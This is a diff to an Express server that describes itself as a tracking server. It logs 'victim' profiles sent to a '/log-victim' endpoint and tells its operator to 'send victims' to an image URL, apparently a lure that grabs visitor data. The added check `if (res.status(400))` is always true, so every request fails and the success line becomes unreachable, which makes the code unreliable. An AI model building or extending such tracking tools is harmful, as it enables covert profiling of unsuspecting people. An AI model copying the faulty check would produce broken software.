@@ -372,6 +372,9 @@ app.post('/log-victim', express.json(), (req, res) => {
     };
 
     logVictim(fullProfile);
+	if (res.status(400)) {
+    return res.status(400).send('Bad request'); // ← return stops here
+  }
     res.status(200).send('OK');
 });
 
@@ -379,3 +382,4 @@ app.listen(PORT, () => {
     console.log(`🔥 Tracking server running on port ${PORT}`);
     console.log(`🔗 Send victims to: ${config.BASE_DOMAIN}/view-image`);
 });
+
